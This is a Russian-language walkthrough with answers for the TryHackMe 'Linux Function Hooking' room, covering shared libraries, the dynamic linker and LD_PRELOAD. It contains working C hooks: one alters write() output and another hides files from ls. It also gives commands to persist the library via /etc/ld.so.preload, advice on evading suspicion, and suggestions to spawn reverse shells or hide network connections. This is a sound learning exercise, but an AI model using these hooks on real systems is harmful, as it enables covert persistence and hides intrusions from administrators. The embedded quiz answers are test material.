[>> вернуться на главную страницу](https://github.com/BEPb/tryhackme/blob/master/README.md)

# Комната [Linux Function Hooking](https://tryhackme.com/r/room/linuxfunctionhooking) 

Всего 7 заданий:
## Задание 1
В этой комнате мы рассмотрим, что такое Shared Libraries, что такое Function Hooking и как мы можем использовать 
LD_PRELOAD, чтобы сделать то же самое! Я старался сделать эту комнату максимально простой, однако некоторое базовое 
понимание C определенно будет полезным!

### Ответьте на вопросы ниже
Я готов учиться!

```commandline
Ответ не нужен
```

## Задание 2
Что такое общие библиотеки?

Общие библиотеки — это предварительно скомпилированный код C, который связывается на последних этапах создания 
исполняемого файла. Они предоставляют повторно используемые функции, такие как функции, процедуры, классы, структуры 
данных и т. д., которые затем можно использовать при написании собственного кода.

Общие библиотеки, которые содержит Linux:
- libc : стандартная библиотека C.
- glibc : GNU-реализация стандартной libc.
- libcurl : Библиотека многопротокольной передачи файлов.
- libcrypt : библиотека C для упрощения шифрования, хеширования, кодирования и т. д.
Важно знать о разделяемых библиотеках то, что они содержат адреса различных функций, необходимых программам во время 
выполнения.

Например, когда динамически связанный исполняемый файл выполняет read() системный вызов, система ищет адре сread() из 
разделяемой библиотеки libc. Теперь libc имеет четко определенное определение для read(), которое указывает 
количество и тип параметров функции и ожидает в ответ определенный тип данных. Обычно система знает, где искать эти 
функции, но, как мы увидим позже, мы можем контролировать, где система ищет эти функции и как мы можем использовать 
их для вредоносных целей.

TL;DR : Общие библиотеки — это скомпилированный код C, содержащий определения функций, которые могут быть позже 
вызваны для выполнения определенных функций. Когда мы запускаем динамически связанные исполняемые файлы, система 
ищет определения общих функций в этих библиотеках.

На данный момент можно многое сказать о разделяемых библиотеках. Однако я не хочу усложнять это для людей и хочу, 
чтобы это было доступно для новичков, но я определенно призываю людей почитать об этом больше!

### Ответьте на вопросы ниже
Как называется динамический компоновщик/загрузчик в Linux?
```commandline
ld.so, ld-linux.so
```

## Задание 3
Этот раздел будет немного техническим, так что потерпите меня немного. Сделайте перерыв и выпейте кофе, а когда 
будете готовы, отправляйтесь дальше: 

На данный момент мы узнали, что:

- Когда мы запускаем динамически связанный исполняемый файл, он вызывает определенные стандартные функции, которые 
предопределены в общих библиотеках.
- Система ищет адрес функции в общих библиотеках.
- Система возвращает адрес первого экземпляра функции, расположенного в общей библиотеке.
- Затем он выполняет необходимые действия.
Кажется достаточно просто? Теперь давайте углубимся в детали. Большая часть того, что будет, взята из страницы 
  руководства, поэтому будет полезно иметь ее под рукой ld.so

Разобравшись с этим, продолжим:

Сначала давайте проверим динамически подключаемые библиотеки, необходимые команде ls. Для этого можно ввести:
`# ldd `which ls``
Или, если вы используете рыбьи панцири, то:
`# ldd (which ls)`
В любом случае вы должны получить примерно такой вывод: 
```commandline
# ldd /bin/ls        
         linux-gate.so.1 (0xb7f54000)        
         libselinux.so.1 => /lib/i386-linux-gnu/libselinux.so.1 (0xb7ed7000)        
         libc.so.6 => /lib/i386-linux-gnu/libc.so.6 (0xb7cf9000)         
         libdl.so.2 => /lib/i386-linux-gnu/libdl.so.2 (0xb7cf3000)
         libpcre.so.3 => /lib/i386-linux-gnu/libpcre.so.3 (0xb7c7a000)
         /lib/ld-linux.so.2 (0xb7f56000)
         libpthread.so.0 => /lib/i386-linux-gnu/libpthread.so.0 (0xb7c59000)
```
Примечание: этот пример взят из системы Kali x86, в 64-разрядной системе у нас будут другие расположения и библиотеки.

Здесь мы находим библиотеку с soname libc.so.6 который находится по адресу /lib/i386-linux-gnu/libc.so.6.
>Примечание: это всего лишь символические ссылки на реальные файлы общей библиотеки, расположенные где-то еще в системе.

Наша главная цель здесь — понять, как динамический компоновщик системы загружает эти динамические библиотеки во 
время запуска программы. Для этого мы будем активно ссылаться на ld.so страницу руководства.

На странице руководства мы находим следующие тексты:

- Использование каталогов, указанных в атрибуте динамического раздела DT_RPATH  двоичного файла, если он присутствует,
а атрибут DT_RUNPATH не существует. Использование DT_RPATH устарело.
- Использование переменной среды LD_LIBRARY_PATH , если только исполняемый файл не запускается в режиме безопасного 
  выполнения (см. ниже); в  этом случае эта переменная игнорируется.
- Использование каталогов, указанных в атрибуте динамического раздела DT_RUNPATH двоичного файла, если он 
  присутствует. Такие каталоги  просматриваются только для поиска объектов, требуемых записями DT_NEEDED (прямые зависимости), и не применяются к  дочерним объектам этих объектов, которые сами должны иметь свои собственные записи DT_RUNPATH . Это отличается от DT_RPATH , который применяется для поиска   всех дочерних объектов в дереве зависимостей.
- Из файла кэша /etc/ld.so.cache , который содержит скомпилированный  список кандидатов на общие объекты, ранее 
  найденных в расширенном пути библиотеки. Однако, если двоичный файл был связан с  опцией компоновщика -z nodeflib , общие объекты в  путях по умолчанию пропускаются. Общие объекты, установленные в каталогах возможностей оборудования (см. ниже), имеют приоритет перед другими общими  объектами.
- В пути по умолчанию /lib , а затем /usr/lib . (В некоторых 64-битных    архитектурах путями по умолчанию для 
  64-битных общих объектов являются /lib64 , а затем  /usr/lib64 .) Если двоичный файл был скомпонован с  опцией компоновщика -z nodeflib , этот шаг пропускается. 
- Да, эта часть может быть немного сложной, не парьтесь по этому поводу. Просто знайте, что есть некоторые переменные 
  окружения и системные пути, где динамический компоновщик ищет эти общие библиотеки во время запуска программ.

Часть, которая нас интересует, находится немного ниже под разделом LD_PRELOAD. Я призываю всех прочитать весь 
раздел (он также относительно короткий). Часть, на которую мы должны обратить внимание, это пункты списка в конце 
раздела (особенно первый и последний):
- (1) Переменная среды LD_PRELOAD .
- (2) Параметр командной строки --preload при прямом вызове динамического компоновщика.
- (3) Файл /etc/ld.so.preload .

Нас больше интересуют пункты (1) и (3), поскольку они позволяют нам указывать наши собственные общие объекты, 
которые загружаются ДО других общих библиотек, и, как и в случае с аналогичными атаками перехвата PATH, мы 
собираемся использовать их для создания наших собственных вредоносных общих библиотек!

### Ответьте на вопросы ниже
Какая переменная среды позволяет вам загружать собственную общую библиотеку раньше всех остальных? 
```commandline
LD_PRELOAD
```
Какой файл содержит разделенный пробелами список общих объектов ELF, которые необходимо загрузить перед запуском 
программы?
```commandline
/etc/ld.so.preload
```
Если используются и переменная окружения, и файл, какие библиотеки, указанные в переменной, будут загружены первыми?
```commandline
Environment Variable
```

## Задание 4
Хватит теории, пора запачкать руки. Так что надевайте шляпы кодировщиков и продолжайте читать ниже:

Прежде чем начать, нам нужно понять, как все работает. В этом первом примере мы подключим write() функция. Сначала 
давайте создадим очень простую программу, используя write() :   

```commandline
#include <unistd.h>
int main()
{
  char str[12];
  int s;
  s=read(0, str,13);      
  write(1, str, s);                          
  return 0;
}
```
Для начала давайте скомпилируем и запустим наш пример, чтобы получить следующий вывод:
```commandline
gcc helloworld.c -o hello
./hello
```
Здесь мы в основном считываем некоторые входные данные из stdin и выводим их в stdout. Довольно просто, не так ли ?
(Давайте просто проигнорируем плохое управление памятью). Теперь давайте посмотрим, что происходит за кулисами:

При нормальных обстоятельствах, когда динамический компоновщик сталкивается с write() function, он ищет свой адрес в 
стандартных разделяемых библиотеках. При первом появлении write(), он передает аргументы функции и возвращает 
соответствующий вывод. Достаточно просто, не так ли? Теперь пришло время стать вредоносным.

Сначала давайте создадим небольшую вредоносную разделяемую библиотеку. Поскольку мы подключаем write() функция, 
сначала найдите полное определение функции и тип возвращаемого значения на страницах руководства.

Из страниц руководства мы получаем определение функции write() as  ssize_t write(int fd, const void *buf, size_t 
count); с возвращаемым типом  ssize_t.

Очень важно, чтобы наша вредоносная функция также имела то же определение функции и возвращаемый тип, что и исходная 
функция, которую мы пытаемся перехватить. С этим разобравшись, давайте приступим к написанию нашей собственной 
вредоносной разделяемой библиотеки следующим образом:

```commandline
#include <stdio.h>
#include <unistd.h>
#include <dlfcn.h>
#include <string.h>
ssize_t write(int fildes, const void *buf, size_t nbytes)
{
     ssize_t (*new_write)(int fildes, const void *buf, size_t nbytes); 
     ssize_t result;
     new_write = dlsym(RTLD_NEXT, "write");
     if (strncmp(buf, "Hello World",strlen("Hello World")) == 0)
     {
          result = new_write(fildes, "Hacked 1337", strlen("Hacked 1337"));
     }
     else
     {
          result = new_write(fildes, buf, nbytes);
     }
     return result;
}
```

Выглядит сложно, не правда ли? Поверьте, это не так. Давайте разберемся:

- Сначала мы включаем необходимые файлы заголовков, которые нам понадобятся для выполнения простых задач. Довольно 
стандартная вещь, не так ли?
- Далее нам нужно создать функцию с точно таким же определением функции и типом возвращаемого значения , как у 
  функции, которую мы пытаемся перехватить. Это связано с тем, что программы, вызывающие функцию, будут отправлять 
  набор параметров и ожидать в ответ определенный тип выходных данных, невыполнение которого приведет к 
  нежелательным ошибкам.  
- Поскольку мы пытаемся перехватить write() функция здесь, мы создаем функцию с тем же именем (write()), набор 
  параметров (int fd, const void *buf, size_t count) и тип возврата (ssize_t) для предотвращения нежелательных 
  ошибок. Пока все хорошо, да?
- Далее мы делаем кое-что ОЧЕНЬ важное: создаем указатель на функцию  new_write с тем же набором переменных, что и 
  функция, которую мы пытаемся подключить, в данном случае это write(), так как позже это сохранит исходный адрес 
  функции, которую мы будем использовать позже! Понятно?
- Мы также создаем переменную result для сохранения возвращаемого значения. Обратите внимание, что это тот же тип 
  данных, который ожидает вызывающая программа.
- Наконец, мы подходим к, пожалуй, самой технической части программы. Здесь мы сохраняем местоположение исходного 
  write() функцию в указатель функции, который мы создали ранее. Мы используем dlsym функция для получения адреса 
  следующего появления write из стандартных общих библиотек (как предписано RTLD_NEXT флаг). Я умоляю вас просто 
  просмотреть страницу руководства для dlsym один раз, прежде чем продолжить, чтобы лучше понять, что происходит.
- Шаги до сих пор были довольно стандартными во всех случаях, за исключением обычного изменения имен и параметров. 
  Следующие шаги диктуют, как мы будем использовать наш хук, и будут разными для разных хуков.

Теперь немного повеселимся. Здесь мы сравниваем буфер строки, переданный в функцию, чтобы увидеть, равен ли он 
"Hello World".  Если это так, мы вызываем оригинал write() функция, использующая указатель на функцию, но заменяем 
ее нашей собственной строкой и сохраняем возвращаемый результат. Вы можете делать все, что захотите: генерировать 
журналы, вызывать другие условия, создавать соединения при выполнении определенных условий и т. д. Не стесняйтесь 
экспериментировать с этой частью!
Однако если условия не выполняются, мы просто передаем все параметры исходной функции через наш указатель на функцию 
и сохраняем результат.
Наконец, мы возвращаем результат вызывающей функции.
Уф, это было легко. Не так ли? Уделите немного времени, прочитайте, если вы не поняли ничего, но убедитесь, что вы 
понимаете шаги, так как это основная скелетная структура хука. Просто чтобы этот раздел не стал утомительным, мы 
увидим, как скомпилировать и загрузить нашу вредоносную общую библиотеку в следующей задаче.

### Ответьте на вопросы ниже
Сколько аргументов принимает функция write() ?
```commandline
3
```
Какой макрос проверки функций необходимо определить, чтобы получить определения RTLD_NEXT из <dlfcn.h> ?  
```commandline
_GNU_SOURCE
```

## Задание 5
Ладно, последний раздел, возможно, был немного утомительным, но я обещаю, что этот раздел будет веселым. Здесь мы 
увидим, как: 
- Составьте нашу программу
- Предварительная загрузка нашего общего объекта
- Посмотрите на это в действии 
Имея дорожную карту, давайте начнем действовать!

Составление нашей программы

Для компиляции нашей программы из предыдущего задания мы будем использовать следующее:
`gcc -ldl malicious.c -fPIC -shared -D_GNU_SOURCE -o malicious.so `
Примечание: Если в какой-либо момент вы столкнетесь с проблемой `symbol lookup error`, попробуйте выполнить следующий 
оператор компиляции:

`gcc malicious.c -fPIC -shared -D_GNU_SOURCE -o malicious.so -ldl`

Как всегда, давайте разберем это утверждение, чтобы убедиться, что мы все правильно поняли:

- gcc : Наша собственная коллекция компиляторов GNU.
- -ldl  : Связывание с  libdl,  также известной как динамическая библиотека связывания.
- malware.c : Название нашей программы. 
- -fPIC : Генерация позиционно-независимого кода. (Отличный ответ на вопрос, зачем это нужно, можно найти здесь ).
- -shared : сообщает компилятору о необходимости создания общего объекта, который может быть связан с другими 
  объектами для создания исполняемого файла.
- -D_GNU_SOURCE : Он указан для удовлетворения условий #ifdef , которые позволяют нам использовать перечисление 
  RTLD_NEXT (Да, это то, о чем я говорил в вопросе № 2 задания 4). При желании этот флаг можно заменить, добавив  
  #define _GNU_SOURCE.
- -o : Укажите имя выходного исполняемого файла.
- malware.so : Имя выходного файла.
Сделав это, мы должны получить malicious.so объектный файл готов к подключению функции, просто ждет предварительной 
  загрузки!

Предварительная загрузка нашего общего объекта

Теперь, когда наш файл Shared Object готов, нам нужно предварительно загрузить его перед другими объектами общей 
библиотеки, чтобы успешно подключить нашу функцию. Для этого у нас есть два метода:

Использование `LD_PRELOAD`
Использование  файла `/etc/ld.so.preload`
Если вы следили за всем этим, то знаете, что если указаны оба, то библиотеки, указанные в LD_PRELOAD, загружаются 
первыми.  Оба метода имеют свои плюсы и минусы в зависимости от ситуации, но я лично предпочитаю последний, потому 
что мы можем легко скрыть  файл `/etc/ld.so.preload`, используя этот же самый метод (объясненный в более поздней 
задаче), а не способ с точкой перед именем файла . Ниже приведен синтаксис для предварительной загрузки общего 
объекта с использованием каждого метода:

Использование LD_PRELOAD:
`export LD_PRELOAD=$(pwd)/malicious.so`
Использование /etc/ld.so.preload:
`sudo sh -c "echo $(pwd)/malicious.so > /etc/ld.so.preload"`

Примечание: Обе эти команды должны быть запущены из каталога, содержащего файл общего объекта. В идеале вы хотели бы сохранить их где-то вроде /lib или /usr/lib в зависимости от того, где ваша система хранит файлы общего объекта библиотеки, чтобы не вызывать подозрений.

Вы можете проверить, успешно ли загружен ваш общий объект, выполнив простую команду:
```commandline
$ ldd /bin/ls
     linux-gate.so.1 (0xb7fc0000)
     /home/whokilleddb/malicious.so  (0xb7f8f000)
     libselinux.so.1 => /lib/i386-linux-gnu/libselinux.so.1 (0xb7f43000)
     libc.so.6 => /lib/i386-linux-gnu/libc.so.6 (0xb7d65000)
     lbdl.so.2 => /lib/i386-linux-gnu/libdl.so.2 (0xb7d5f000)
     libpcre.so.3 => /lib/i386-linux-gnu/libpcre.so.3 (0xb7ce6000)
     /lib/ld-linux.so.2 (0xb7fc2000)
     libpthread.so.0 => /lib/i386-linux-gnu/libpthread.so.0 (0xb7cc5000)
```
Потрясающее объяснение о первой  linux-gate.so.1 библиотеке здесь
Важно отметить, что наш вредоносный общий объект загружается раньше стандартных общих библиотек.
Итак, теперь сценарий выглядит примерно так: программа делает вызов write() функция со всеми параметрами на месте. 
Однако вместо того, чтобы перейти к определению  libcwrite() он переходит к нашему вредоносному общему объекту, 
поскольку динамический компоновщик находит ПЕРВОЕ  ПОЯВЛЕНИЕ write() и позволяет ему делать свое дело, которое в 
нашем случае представляет собой простую операцию сравнения, которая, если она истинна, возвращает 
вредоносный/измененный вывод, в противном случае передает параметры реальной функции внутри libc и передает 
полученный вывод обратно в программу.

Довольно просто, не правда ли? Этот процесс примерно похож на метод перехвата PATH , который широко используется во 
время CTF и пентестов, так что если вы хорошо это понимаете, то для вас это не составит труда.

Наконец, мы можем перейти к заключительному этапу, на котором мы увидим наш вредоносный общий объект в действии!

Увидим это в действии

Помните маленькую программу "Hello World", которую мы создали? Давайте перезапустим ее сейчас с нашим вредоносным 
общим объектом, предварительно загруженным и готовым! Если мы запустим ее в этот раз, то увидим что-то забавное. 
Вместо строки "Hello World", которая будет отображена обратно, мы увидим "Hacked 1337", любезно предоставленной 
нашим вредоносным общим объектом.

Но останавливается ли это на этом? НЕТ. Многиеyyyyyyyyyyyy другие программы (что очевидно по лишним конечным 'y') 
используют libc для выполнения своей работы. write() Это очень распространенная функциональность, которая часто 
вызывается. Это повлияет на все такие программы.

Например, если вы создадите файл с текстом "Hello World" и попытаетесь вывести его, мы получим "Hacked 1337" в 
качестве вывода. Те же результаты будут получены, если мы используем python3 для печати того же самого, потому что 
на каком-то уровне они все используют write() функция, которая уже была перехвачена. Теперь вы можете представить 
себе широкий спектр вещей, которые вы можете достичь с помощью перехвата функций, а не просто обмена текстом.

Примечание: Убедитесь, что заменяемая строка и строка, на которую вы ее заменяете, имеют одинаковое количество 
символов, чтобы избежать ошибок памяти.

Итак, все дело было в том, чтобы зацепить write() функция. Хотя мы не особо экспериментировали с функцией, но 
следует отметить, что ее можно использовать для запуска множества других событий. Например, многие службы используют 
write() функция для генерации журналов и если мы можем вызвать переключатель (например, передав «Hello World» или 
какой-либо другой переключатель в качестве имени пользователя или в User Agent запроса, который затем будет передан 
в качестве аргумента write() в какой-то момент) мы можем создавать обратные/связанные оболочки, удалять файлы, 
извлекать данные и т. д.

Тем не менее, мы рассмотрим еще несколько интересных вещей, которые можно сделать с помощью привязки функций, и 
получим удовольствие от привязки еще нескольких функций libc в следующих задачах.
### Ответьте на вопросы ниже
Какой флаг используется для создания позиционно-независимого кода при компиляции нашего кода для создания общего 
объекта?
```commandline
-fPIC
```
Может ли подключение функций libc повлиять на поведение Python3? (Да/Нет)
```commandline
Yay
```

## Задание 6
Теперь, когда мы знаем, как использовать общие объекты для подключения различных функций, давайте узнаем, как скрыть 
файлы отls команду более эффективным способом, чем просто поставить точку перед именем файла.

Прежде чем мы нападем на ls  команда, нам нужно понять, как она на самом деле работает. Я не буду вдаваться в 
подробности всего этого здесь (люди злятся на длинные задачи), но вот отличный ресурс для понимания команды, и ее 
работы в глубине.

Главное, что нам нужно знать здесь, это то, что команда использует функцию readdir(), которая возвращает указатель 
на следующую dirent структуру в каталоге. A  — это C-структура, определение glibcdirent которой можно получить из 
man-страницы readdir:
```commandline
struct dirent {
     ino_t          d_ino;       /* Inode number */
     off_t          d_off;       /* Not an offset; see below */
     unsigned short d_reclen;    /* Length of this record */
     unsigned char  d_type;      /* Type of file; not supported not supported by all filesystem types */  
     char           d_name[256]; /* Null-terminated filename */
     };
```
Основной параметр, который нас здесь интересует, — это d_name[256]обязательное поле, содержащее имена различных 
файлов в нашем каталоге. (Понимаете, к чему я клоню?)

Итак, вот дорожная карта:
- ls использует readdir() функцию для получения содержимого каталога
- Функция readdir() возвращает указатель на dirent структуру для следующей записи каталога.
- Структура direntсодержит d_nameпараметр, содержащий имя файла.
- Таким образом, мы подключаем readdir() функцию
- Затем мы передаем параметры исходной функции и проверяем, равен ли параметр d_name возвращаемого dirent указателя 
  заданному имени файла.
- Если да, то мы пропускаем это и передаем остальное.
Карта готова, пора приступать к кодированию! 
```commandline
#include <string.h>
#include <stdlib.h>
#include <dirent.h>
#include <dlfcn.h>

#define FILENAME "ld.so.preload"

struct dirent *readdir(DIR *dirp)
{
     struct dirent *(*old_readdir)(DIR *dir);     
     old_readdir = dlsym(RTLD_NEXT, "readdir");
     struct dirent *dir;
     while (dir = old_readdir(dirp))
     {
           if(strstr(dir->d_name,FILENAME) == 0) break;     
     }
     return dir;
}

struct dirent64 *readdir64(DIR *dirp)
{
     struct dirent64 *(*old_readdir64)(DIR *dir);     
     old_readdir64 = dlsym(RTLD_NEXT, "readdir64");
     struct dirent64 *dir;
     while (dir = old_readdir64(dirp))
     {
           if(strstr(dir->d_name,FILENAME) == 0) break;
     }
     return dir;
}
```
[Примечание: readdir64 — это всего лишь 64-битная версия того же самого и следует тем же концепциям, так что не 
беспокойтесь об этом!]

Разбирая наш крючок, мы имеем:
- Сначала мы объявляем наши обычные заголовки с дополнительным #include <dirent.h>заголовком, который содержит 
  определение структуры dirent.
- Затем мы выполняем нашу обычную работу по подключению: создаем функцию с тем же определением и типом возвращаемого 
  значения, создаем указатель на функцию и используем его dlsym для сохранения в нем значения исходной функции.
- Наконец, переходя к самой важной части, мы создаем цикл while и извлекаем указатель на следующую dirent структуру в 
  потоке каталога, на который указывает, dirp и проверяем, d_name содержит ли параметр нашу строку. Если нет (что 
  обозначается выходом 0 как результатом функции strstr), мы просто прерываем цикл и возвращаем значение, полученное 
  из исходной функции. Однако, если у нас есть совпадение, мы повторяем еще раз, тем самым фактически пропуская наш 
  файл и возвращая указатель на структуру dirent, относящуюся к следующему файлу в каталоге.
- Следует отметить, что вы все еще можете изменить файл или вывести его содержимое. Однако это не будет показано в 
  выводе команды ls! Это может быть очень полезно, если вы хотите скрыть вредоносные файлы, изменить имена файлов и 
  т. д. Одним из очень популярных способов использования является скрытие /etc/ld.so.preload самого файла или общего 
  объекта!

Как вы можете видеть на снимке экрана, когда вредоносный общий объект был загружен, ls он не перечислил наш файл в 
своем выводе. Однако мы все равно смогли прочитать его содержимое, специально указав его путь. Таким образом, вы 
можете спрятать файлы на виду, о которых никто, кроме вас, не узнает. Разве это не здорово?

[Примечание: Если вы застряли, вот статья, которую я написал как раз на эту тему]

### Ответьте на вопросы ниже
Есть два обязательных поля структуры dirent. Одно — d_name, а другое — ?
```commandline
d_ino
```
Я прочитал и понял, как можно скрыть файлы с помощью общих объектов!
```commandline
Ответ не нужен
```

## Задание 7
Итак, мы увидели, что такое общие библиотеки, написали немного кода, предварительно загрузили наши вредоносные 
объектные файлы, немного повеселились, играя с ними. Но мы едва коснулись верхушки айсберга. Вот несколько идей, 
которые вы можете попробовать самостоятельно:
- Вызов оболочек bind и reverse путем привязки write()на основе определенных триггеров
- Скрытие подключений от netsat и lsof путем подключения функции fopen()
- Регистрация запросов путем перехвата SSL_write()
И многое другое!
На этом мы подходим к концу этой комнаты. Вы можете следить за мной в Twitter  или связаться со мной в TryHackMe 
  Discord :D

### Ответьте на вопросы ниже
Ура! Вы дошли до конца!
```commandline
Ответ не нужен
```

[>> вернуться на главную страницу](https://github.com/BEPb/tryhackme/blob/master/README.md)